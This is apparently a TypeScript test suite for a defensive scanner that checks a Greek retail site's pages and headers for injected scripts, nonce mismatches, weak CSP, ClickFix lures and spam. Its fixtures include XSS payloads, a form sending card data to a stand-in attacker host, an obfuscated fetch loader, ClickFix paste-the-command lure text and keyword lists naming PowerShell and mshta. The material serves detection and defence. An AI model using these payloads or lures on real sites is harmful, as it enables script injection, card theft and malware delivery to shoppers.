import { test } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { buildCsp } from "../csp";
import { ALLOWED_CDN_CGI, ALLOWED_FRAME_HOSTS, CLICKFIX_MARKERS, SPAM_MARKERS, REQUIRED_HEADERS, allowedScriptHosts } from "./policy";
import { parseScripts, classifyPage, scanPage, checkHeaders, scanContent, newOrigins, fingerprint, worst, type Finding } from "./rules";

const ORIGIN = "https://euronics.dgsoft.gr";
const BUILD = new Set(["chunks/webpack-abc.js", "chunks/app/[slug]/page-def.js"]);
const ctx = (over: Partial<Parameters<typeof scanPage>[1]> = {}) => ({ origin: ORIGIN, buildChunks: BUILD, allowedScriptHosts: [] as string[], ...over });
const crit = (fs: Finding[]) => fs.filter((f) => f.severity === "critical");
const sev = (fs: Finding[]) => worst(fs.map((f) => f.severity));

/** Σελίδα όπως τη βγάζει το Next: chunks με nonce, RSC payload σε inline scripts με nonce, JSON-LD χωρίς nonce. */
const page = (body = "", head = "") => `<!DOCTYPE html><html lang="el"><head><meta charset="utf-8">
<link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-abc.js" nonce="N1"/>
<script src="/_next/static/chunks/webpack-abc.js" async="" nonce="N1"></script>
<script src="/_next/static/chunks/app/%5Bslug%5D/page-def.js?dpl=dpl_123" async="" nonce="N1"></script>
${head}</head><body><h1>Πλυντήριο ρούχων 9kg</h1>
<script type="application/ld+json">{"@context":"https://schema.org","@type":"Product","name":"Πλυντήριο"}</script>
<iframe src="https://www.youtube-nocookie.com/embed/xyz" title="video"></iframe>
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-ABC" height="0" width="0"></iframe></noscript>
${body}
<script nonce="N1">(self.__next_f=self.__next_f||[]).push([0])</script>
<script nonce="N1">self.__next_f.push([1,"1:\\"$Sreact.fragment\\"\\n2:I[123,[],\\"default\\"]\\n"])</script>
</body></html>`;

// ── policy ────────────────────────────────────────────────────────────────────────────────────────────────────────────
test("policy: λίστες και δείκτες υπάρχουν· ALLOWED_CDN_CGI κενή (δεν χρησιμοποιούμε καμία λειτουργία /cdn-cgi/)", () => {
  assert.deepEqual([...ALLOWED_CDN_CGI], []);
  for (const h of ["youtube.com", "youtube-nocookie.com", "player.vimeo.com", "googletagmanager.com", "td.doubleclick.net"]) assert.ok(ALLOWED_FRAME_HOSTS.includes(h), h);
  for (const word of ["powershell", "mshta", "windows terminal", "win+r", "capembed"]) assert.ok(CLICKFIX_MARKERS.some((m) => m.label.toLowerCase().includes(word)), word);
  assert.ok(SPAM_MARKERS.length >= 6);
  assert.ok(REQUIRED_HEADERS.some((h) => h.name === "strict-transport-security"));
  assert.ok(REQUIRED_HEADERS.some((h) => h.name === "x-content-type-options"));
});

test("allowedScriptHosts: μόνο οι hosts των ρυθμισμένων pixels", () => {
  assert.deepEqual(allowedScriptHosts({}), []);
  assert.deepEqual(allowedScriptHosts({ gtm: "", clarity: "  " }), []);
  assert.deepEqual(allowedScriptHosts({ gtm: "GTM-ABC" }), ["googletagmanager.com"]);
  const all = allowedScriptHosts({ ga4: "G-1", metaPixel: "1", tiktokPixel: "T", clarity: "c", hotjar: "1" });
  for (const h of ["googletagmanager.com", "google-analytics.com", "connect.facebook.net", "analytics.tiktok.com", "clarity.ms", "static.hotjar.com"]) assert.ok(all.includes(h), h);
});

// ── parseScripts ─────────────────────────────────────────────────────────────────────────────────────────────────────
test("parseScripts: src / host / inline / nonce / iframes", () => {
  const r = parseScripts(`<script src="https://www.googletagmanager.com/gtag/js?id=G-1&amp;l=dataLayer" nonce="abc" async></script>
<script nonce='abc' data-x="a>b">console.log(1)</script><SCRIPT>alert(1)</SCRIPT>
<script src=/_next/static/chunks/x.js></script><script src="//evil.example/y.js"></script>
<iframe src="https://player.vimeo.com/video/1"></iframe><iframe srcdoc="<b>x</b>"></iframe><iframe></iframe>`);
  assert.equal(r.scripts.length, 5);
  assert.deepEqual(r.scripts.map((s) => [s.src, s.host, s.inline, s.nonce]), [
    ["https://www.googletagmanager.com/gtag/js?id=G-1&l=dataLayer", "www.googletagmanager.com", false, "abc"],
    [null, null, true, "abc"],
    [null, null, true, null],
    ["/_next/static/chunks/x.js", null, false, null],
    ["//evil.example/y.js", "evil.example", false, null],
  ]);
  assert.equal(r.scripts[1].code, "console.log(1)");
  assert.deepEqual(r.iframes, ["https://player.vimeo.com/video/1", "about:srcdoc", "about:blank"]);
});

// ── classifyPage ─────────────────────────────────────────────────────────────────────────────────────────────────────
test("classifyPage: γνήσια σελίδα ελέγχου του Cloudflare / σελίδα / σφάλμα", () => {
  assert.equal(classifyPage(403, { server: "cloudflare", "cf-mitigated": "challenge" }, "<title>Just a moment...</title>"), "challenge");
  assert.equal(classifyPage(403, { Server: "cloudflare", "CF-Mitigated": "challenge" }, ""), "challenge");
  assert.equal(classifyPage(503, { server: "cloudflare" }, "<html><head><title>Just a moment…</title></head></html>"), "challenge");
  assert.equal(classifyPage(200, { server: "cloudflare" }, "<title>Euronics</title>"), "page");
  // «Just a moment» σε απάντηση 200 ΔΕΝ είναι έλεγχος του Cloudflare — σαρώνεται κανονικά (εκεί πιάνεται το ClickFix)
  assert.equal(classifyPage(200, { server: "cloudflare" }, "<title>Just a moment...</title>"), "page");
  assert.equal(classifyPage(403, { server: "nginx" }, "<title>Just a moment...</title>"), "error");
  assert.equal(classifyPage(500, {}, "oops"), "error");
  assert.equal(classifyPage(404, { server: "cloudflare" }, "not found"), "error");
});

// ── scanPage ─────────────────────────────────────────────────────────────────────────────────────────────────────────
test("scanPage: νόμιμη σελίδα (chunks του build, RSC με το nonce μας, JSON-LD, iframes της λίστας) → κανένα εύρημα", () => {
  assert.deepEqual(scanPage(page(), ctx()), []);
  // χωρίς λίστα build (εξωτερικός φύλακας): τα /_next/static γίνονται δεκτά
  assert.deepEqual(scanPage(page(), ctx({ buildChunks: null })), []);
});

test("scanPage: chunk εκτός build → critical", () => {
  const f = scanPage(page("", `<script src="/_next/static/chunks/evil-999.js" async nonce="N1"></script>`), ctx());
  assert.equal(crit(f).length, 1);
  assert.match(crit(f)[0].evidence ?? "", /evil-999\.js/);
});

test("scanPage: script από άγνωστο host → critical· host της λίστας → τίποτα· look-alike → critical", () => {
  assert.equal(sev(scanPage(page(`<script src="https://evil.example/x.js"></script>`), ctx())), "critical");
  const gtag = `<script src="https://www.googletagmanager.com/gtag/js?id=G-1" nonce="N1" async></script>`;
  assert.deepEqual(scanPage(page(gtag), ctx({ allowedScriptHosts: ["googletagmanager.com"] })), []);
  assert.equal(sev(scanPage(page(gtag), ctx())), "critical"); // δεν είναι ρυθμισμένο → δεν επιτρέπεται
  const lookalike = `<script src="https://googletagmanager.com.evil.example/gtm.js" nonce="N1"></script>`;
  assert.equal(sev(scanPage(page(lookalike), ctx({ allowedScriptHosts: ["googletagmanager.com"] }))), "critical");
  assert.equal(sev(scanPage(page(`<script src="data:text/javascript,alert(1)" nonce="N1"></script>`), ctx())), "critical");
  // δικό μας domain αλλά εκτός /_next/static
  assert.equal(sev(scanPage(page(`<script src="/uploads/x.js" nonce="N1"></script>`), ctx({ buildChunks: null }))), "critical");
});

test("scanPage: inline script χωρίς nonce → critical· JSON-LD χωρίς nonce → τίποτα", () => {
  assert.equal(sev(scanPage(page(`<script>document.write("x")</script>`), ctx())), "critical");
  assert.deepEqual(scanPage(page(`<script type="application/ld+json">{"a":1}</script>`), ctx()), []);
});

test("scanPage: iframe εκτός λίστας / srcdoc → critical", () => {
  assert.equal(sev(scanPage(page(`<iframe src="https://evil.example/frame"></iframe>`), ctx())), "critical");
  assert.equal(sev(scanPage(page(`<iframe srcdoc="<script>alert(1)</script>"></iframe>`), ctx())), "critical");
  assert.equal(sev(scanPage(page(`<iframe src="https://www.youtube.com.evil.example/embed"></iframe>`), ctx())), "critical");
});

test("scanPage: σελίδα με «Windows Terminal» + «Win+R» → critical", () => {
  const f = scanPage(page(`<div>Για να επαληθεύσετε: πατήστε Win+R, μετά ανοίξτε το Windows Terminal και επικολλήστε.</div>`), ctx());
  assert.equal(sev(f), "critical");
});

test("scanPage: «Performing security verification» σε κανονική σελίδα (όχι γνήσιο challenge) → critical", () => {
  assert.equal(sev(scanPage(page(`<p>Performing security verification</p>`), ctx())), "critical");
  assert.equal(sev(scanPage(page(`<p>Verify you are human by completing the action below.</p>`), ctx())), "critical");
});

test("scanPage: μία μόνο ύποπτη λέξη σε κείμενο προϊόντος (PowerShell) → warn, όχι critical", () => {
  const f = scanPage(page(`<p>Windows 11 Pro: περιλαμβάνει PowerShell για διαχειριστές.</p>`), ctx());
  assert.equal(sev(f), "warn");
});

test("scanPage: Cloudflare Zaraz — script από /cdn-cgi/zaraz/ → critical (το τεκμήριο χωρίς το μεταβλητό query)", () => {
  const f = scanPage(page("", `<script src="/cdn-cgi/zaraz/s.js?z=abc" nonce="CF"></script>`), ctx());
  assert.equal(sev(f), "critical");
  const z = f.find((x) => /zaraz/i.test(x.title + x.detail));
  assert.ok(z, JSON.stringify(f));
  assert.equal(z.evidence, "/cdn-cgi/zaraz/s.js");
  // ακόμη κι αν λείπει η λίστα build
  assert.equal(sev(scanPage(page("", `<script src="/cdn-cgi/zaraz/s.js?z=abc" nonce="N1"></script>`), ctx({ buildChunks: null }))), "critical");
});

test("scanPage: inline loader του Zaraz με nonce → critical (το nonce δεν αρκεί)", () => {
  const loader = `<script nonce="N1">(function(w,d){w.zarazData=w.zarazData||{};var s=d.createElement("script");s.src="/cdn-cgi/zaraz/s.js?z="+btoa(1);d.head.appendChild(s)})(window,document)</script>`;
  assert.equal(sev(scanPage(page("", loader), ctx())), "critical");
});

test("scanPage: άλλες λειτουργίες /cdn-cgi/ (email-decode, rocket-loader) → critical, εκτός αν είναι ρητά στη λίστα", () => {
  const email = `<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>`;
  assert.equal(sev(scanPage(page(email), ctx())), "critical");
  assert.deepEqual(scanPage(page(email.replace("<script ", '<script nonce="N1" ')), ctx({ allowedCdnCgi: ["/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode"] })), []);
  const rocket = `<script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="abc-|49" defer></script><script type="abc123-text/javascript" nonce="N1">var x=1</script>`;
  assert.equal(sev(scanPage(page(rocket), ctx())), "critical");
});

test("scanPage: inline script με nonce αλλά συγκαλυμμένο κώδικα (char codes + localStorage 'verified') → critical", () => {
  const codes = Array.from("fetch('https://posthog.example/x')", (c) => c.charCodeAt(0)).join(",");
  const payload = `<script nonce="N1">(function(){if(localStorage.getItem('verified'))return;var u=[${codes}].map(function(c){return String.fromCharCode(c)}).join("");})()</script>`;
  const f = scanPage(page(payload), ctx());
  assert.equal(sev(f), "critical");
  assert.ok(f.some((x) => /nonce/i.test(x.detail)), "το εύρημα εξηγεί ότι το nonce δεν αρκεί");
  assert.equal(sev(scanPage(page(`<script nonce="N1">var d=atob(atob(x));new Function(d)();fetch("/a")</script>`), ctx())), "critical");
  assert.equal(sev(scanPage(page(`<script nonce="N1">new CapEmbed({el:"#c"})</script>`), ctx())), "critical");
  assert.equal(sev(scanPage(page(`<script nonce="N1">fetch("https://posthoganalytics.com/e")</script>`), ctx())), "critical");
});

test("scanPage: scripts με δύο διαφορετικά nonce → critical", () => {
  const f = scanPage(page(`<script nonce="ZZ">window.x=1</script>`), ctx());
  assert.equal(sev(f), "critical");
  assert.ok(f.some((x) => /nonce/i.test(x.title)));
  // το τεκμήριο δεν περιέχει τις τιμές των nonce (αλλάζουν σε κάθε αίτημα → σπάνε το dedupe)
  assert.ok(f.every((x) => !(x.evidence ?? "").includes("ZZ") && !(x.evidence ?? "").includes("N1")));
});

test("scanPage: το «ξένο» nonce είναι αυτό που ΔΕΝ έχουν τα chunks του Next, ακόμη κι αν έχει περισσότερα scripts", () => {
  const html = `<script src="/_next/static/chunks/webpack-abc.js" nonce="N1"></script>
<script nonce="CF">(function(){var s=document.createElement("script");s.src="/cdn-cgi/zaraz/s.js?z="+x;document.head.appendChild(s)})()</script>
<script src="/cdn-cgi/zaraz/s.js?z=abc" nonce="CF"></script>`;
  const n = scanPage(html, ctx()).find((x) => /διαφορετικά nonce/.test(x.title));
  assert.ok(n);
  assert.match(n.evidence ?? "", /\/cdn-cgi\/zaraz\/s\.js/);
  assert.doesNotMatch(n.evidence ?? "", /_next/);
});

// ── checkHeaders ─────────────────────────────────────────────────────────────────────────────────────────────────────
const goodHeaders = (nonce = "abc123") => ({
  "content-security-policy": buildCsp({ nonce, dev: false }),
  "strict-transport-security": "max-age=31536000; includeSubDomains",
  "x-content-type-options": "nosniff",
});

test("checkHeaders: τα headers της εφαρμογής (buildCsp παραγωγής + HSTS + nosniff) → κανένα εύρημα", () => {
  assert.deepEqual(checkHeaders(goodHeaders()), []);
  // κεφαλαία ονόματα headers
  const up = Object.fromEntries(Object.entries(goodHeaders()).map(([k, v]) => [k.toUpperCase(), v]));
  assert.deepEqual(checkHeaders(up), []);
});

test("checkHeaders: CSP λείπει / μόνο report-only → critical", () => {
  const { "content-security-policy": csp, ...rest } = goodHeaders();
  assert.equal(sev(checkHeaders(rest)), "critical");
  assert.equal(sev(checkHeaders({ ...rest, "content-security-policy-report-only": csp })), "critical");
});

test("checkHeaders: 'unsafe-inline' σε script-src ή style-src → critical", () => {
  assert.equal(sev(checkHeaders({ ...goodHeaders(), "content-security-policy": "script-src 'self' 'unsafe-inline'; frame-ancestors 'self'" })), "critical");
  assert.equal(sev(checkHeaders({ ...goodHeaders(), "content-security-policy": "default-src 'self' 'unsafe-inline'; frame-ancestors 'self'" })), "critical");
  const style = buildCsp({ nonce: "n", dev: false }).replace("style-src 'self'", "style-src 'self' 'unsafe-inline'");
  assert.equal(sev(checkHeaders({ ...goodHeaders(), "content-security-policy": style })), "critical");
  const evalCsp = buildCsp({ nonce: "n", dev: false }).replace("'strict-dynamic'", "'strict-dynamic' 'unsafe-eval'");
  assert.equal(sev(checkHeaders({ ...goodHeaders(), "content-security-policy": evalCsp })), "critical");
});

test("checkHeaders: δεύτερο nonce στο CSP (π.χ. Cloudflare Zaraz) → critical", () => {
  const two = buildCsp({ nonce: "ours", dev: false }).replace("'nonce-ours'", "'nonce-ours' 'nonce-cfzaraz'");
  const f = checkHeaders({ ...goodHeaders(), "content-security-policy": two });
  assert.equal(sev(f), "critical");
  assert.ok(f.some((x) => /Δεύτερο nonce/.test(x.title)), JSON.stringify(f));
  // δεύτερη πολιτική (δύο headers ενωμένα με κόμμα) με άλλο nonce → επίσης
  const joined = `${buildCsp({ nonce: "ours", dev: false })}, script-src 'nonce-other'`;
  assert.equal(sev(checkHeaders({ ...goodHeaders(), "content-security-policy": joined })), "critical");
  // ίδιο εύρημα με άλλο nonce ανά αίτημα → ίδιο fingerprint (dedupe)
  const two2 = buildCsp({ nonce: "x9", dev: false }).replace("'nonce-x9'", "'nonce-x9' 'nonce-y8'");
  const a = checkHeaders({ ...goodHeaders(), "content-security-policy": two }).find((x) => /Δεύτερο nonce/.test(x.title))!;
  const b = checkHeaders({ ...goodHeaders(), "content-security-policy": two2 }).find((x) => /Δεύτερο nonce/.test(x.title))!;
  assert.equal(fingerprint("site", a), fingerprint("site", b));
});

test("checkHeaders: λείπουν HSTS / nosniff / frame-ancestors → warn (όχι critical)", () => {
  const csp = buildCsp({ nonce: "n", dev: false }).replace("; frame-ancestors 'self'", "");
  const f = checkHeaders({ "content-security-policy": csp });
  assert.equal(f.length, 3, JSON.stringify(f));
  assert.ok(f.every((x) => x.severity === "warn"));
});

test("checkHeaders: expectedConnectSrc — πηγή connect-src εκτός λίστας → critical· χωρίς τη λίστα δεν ελέγχεται", () => {
  const expected = ["'self'", "https://*.google-analytics.com"];
  const csp = "script-src 'nonce-a' 'strict-dynamic'; style-src 'nonce-a'; connect-src 'self' https://*.google-analytics.com https://posthoganalytics.com; frame-ancestors 'self'";
  const h = { ...goodHeaders(), "content-security-policy": csp };
  const f = checkHeaders(h, { expectedConnectSrc: expected });
  assert.equal(sev(f), "critical");
  assert.ok(f.some((x) => (x.evidence ?? "").includes("posthoganalytics.com")));
  assert.deepEqual(checkHeaders(h), []);
  assert.deepEqual(checkHeaders({ ...h, "content-security-policy": csp.replace(" https://posthoganalytics.com", "") }, { expectedConnectSrc: expected }), []);
});

// ── scanContent ──────────────────────────────────────────────────────────────────────────────────────────────────────
test("scanContent: YouTube iframe + «επαλήθευση στοιχείων» → κανένα εύρημα", () => {
  assert.deepEqual(scanContent(`<p>Για επαλήθευση στοιχείων παραγγελίας καλέστε μας.</p><iframe src="https://www.youtube.com/embed/abc" allowfullscreen></iframe>`), []);
});

test("scanContent: ένεση κώδικα → critical", () => {
  for (const html of [
    `<img src=x onerror=alert(1)>`,
    `<svg/onload=alert(1)>`,
    `<p>ok</p><script>alert(1)</script>`,
    `<a href="javascript:alert(1)">x</a>`,
    `<a href="java&#x73;cript:alert(1)">x</a>`,
    `<a href="  JaVaScRiPt:alert(1)">x</a>`,
    `<iframe srcdoc="<b>x</b>"></iframe>`,
    `<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>`,
    `<iframe src="https://evil.example/x"></iframe>`,
    `<form action="https://evil.example/collect" method="post"><input name="card"></form>`,
    `<button formaction="https://evil.example/c">x</button>`,
    `<object data="x.swf"></object>`,
    `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
    `<p>Πατήστε Win + R και επικολλήστε (Ctrl+V) την εντολή για να επαληθεύσετε.</p>`,
    `<p>Verify you are human</p>`,
  ]) assert.equal(sev(scanContent(html)), "critical", html);
});

test("scanContent: φόρμα προς δικό μας host / σχετική → κανένα εύρημα", () => {
  assert.deepEqual(scanContent(`<form action="/anazitisi"><input name="q"></form>`), []);
  assert.deepEqual(scanContent(`<form action="https://euronics.dgsoft.gr/anazitisi"></form>`, { ownHosts: ["euronics.dgsoft.gr"] }), []);
  assert.equal(sev(scanContent(`<form action="https://euronics.dgsoft.gr/anazitisi"></form>`)), "critical");
});

test("scanContent: spam → warn (ελληνικά και αγγλικά)", () => {
  for (const t of ["Το καλύτερο καζίνο online", "Best CASINO bonus", "Αγόρασε viagra", "Γρήγορα δάνεια χωρίς δικαιολογητικά", "cheap loans today", "crypto signals"]) {
    const f = scanContent(t);
    assert.equal(sev(f), "warn", t);
  }
  assert.match(scanContent(`<a href="https://x.example/casino">x</a>`)[0].evidence ?? "", /«casino»/);
});

test("scanContent: συνηθισμένα κείμενα προϊόντων δεν δίνουν ψευδή critical", () => {
  for (const t of [
    "<p>Windows 11 Pro με PowerShell και Windows Terminal για επαγγελματίες.</p>", // λέξεις λογισμικού — μόνο προειδοποίηση
    "<p>Οδηγός: JavaScript: τα βασικά για αρχάριους.</p>",
    "<p>Ηλεκτρική οδοντόβουρτσα Oral-B για ενήλικες (adult).</p>",
    "<p>Ρομποτική σκούπα — μοντέλο XL, κωδικός 12,34,56.</p>",
  ]) assert.notEqual(sev(scanContent(t)), "critical", t);
  assert.deepEqual(scanContent("<p>Ηλεκτρική οδοντόβουρτσα Oral-B για ενήλικες (adult).</p>"), []);
  assert.deepEqual(scanContent(""), []);
});

// ── newOrigins ───────────────────────────────────────────────────────────────────────────────────────────────────────
const d = (s: string) => new Date(s);
test("newOrigins: ίδια IP → τίποτα· νέα χώρα → newCountry· νέα IP ίδιας χώρας → newCountry false", () => {
  const history = [
    { staffId: "a", ip: "1.1.1.1", country: "GR", at: d("2026-09-01") },
    { staffId: "b", ip: "2.2.2.2", country: "GR", at: d("2026-09-02") },
  ];
  assert.deepEqual(newOrigins(history, [{ staffId: "a", ip: "1.1.1.1", country: "GR", at: d("2026-10-20T08:00Z") }]), []);
  assert.deepEqual(newOrigins(history, [{ staffId: "a", ip: "9.9.9.9", country: "NL", at: d("2026-10-20T08:00Z") }]), [{ staffId: "a", ip: "9.9.9.9", country: "NL", newCountry: true }]);
  assert.deepEqual(newOrigins(history, [{ staffId: "a", ip: "1.1.1.2", country: "gr", at: d("2026-10-20T08:00Z") }]), [{ staffId: "a", ip: "1.1.1.2", country: "gr", newCountry: false }]);
  // η IP του b δεν μετρά για τον a
  assert.deepEqual(newOrigins(history, [{ staffId: "a", ip: "2.2.2.2", country: "GR", at: d("2026-10-20T08:00Z") }]), [{ staffId: "a", ip: "2.2.2.2", country: "GR", newCountry: false }]);
});

test("newOrigins: ιστορικό που περιέχει και τις πρόσφατες δεν κρύβει τις νέες· διπλές ενώνονται· χωρίς ιστορικό = νέα χώρα", () => {
  const recent = [
    { staffId: "a", ip: "9.9.9.9", country: "NL", at: d("2026-10-20T08:00Z") },
    { staffId: "a", ip: "9.9.9.9", country: "NL", at: d("2026-10-20T08:05Z") },
  ];
  const history = [{ staffId: "a", ip: "1.1.1.1", country: "GR", at: d("2026-09-01") }, ...recent];
  assert.deepEqual(newOrigins(history, recent), [{ staffId: "a", ip: "9.9.9.9", country: "NL", newCountry: true }]);
  assert.deepEqual(newOrigins([], [{ staffId: "n", ip: "3.3.3.3", country: "GR", at: d("2026-10-20") }]), [{ staffId: "n", ip: "3.3.3.3", country: "GR", newCountry: true }]);
  // άγνωστη χώρα: νέα IP αλλά δεν λέμε «νέα χώρα»
  assert.deepEqual(newOrigins(history, [{ staffId: "a", ip: "4.4.4.4", country: null, at: d("2026-10-20") }]), [{ staffId: "a", ip: "4.4.4.4", country: null, newCountry: false }]);
  assert.deepEqual(newOrigins([], []), []);
});

// ── fingerprint / worst ──────────────────────────────────────────────────────────────────────────────────────────────
test("fingerprint: sha256(key, title, evidence) — ίδιο με το node:crypto, και με ελληνικά", () => {
  const f: Finding = { severity: "critical", title: "Άγνωστο script", detail: "λεπτομέρειες που δεν μετρούν", evidence: "https://evil.example/x.js" };
  const expected = createHash("sha256").update("site\nΆγνωστο script\nhttps://evil.example/x.js", "utf8").digest("hex");
  assert.equal(fingerprint("site", f), expected);
  assert.equal(fingerprint("site", { ...f, detail: "άλλο" }), expected);
  assert.notEqual(fingerprint("content", f), expected);
  assert.equal(fingerprint("x", { severity: "warn", title: "t", detail: "" }), createHash("sha256").update("x\nt\n").digest("hex"));
  // μεγάλο κείμενο (πολλά blocks του sha256)
  const big = "α".repeat(10_000);
  assert.equal(fingerprint("k", { severity: "warn", title: big, detail: "" }), createHash("sha256").update(`k\n${big}\n`).digest("hex"));
});

test("worst: critical > error > warn > ok", () => {
  assert.equal(worst(["ok", "warn", "error"]), "error");
  assert.equal(worst(["ok", "critical", "error"]), "critical");
  assert.equal(worst(["ok", "warn"]), "warn");
  assert.equal(worst([]), "ok");
});
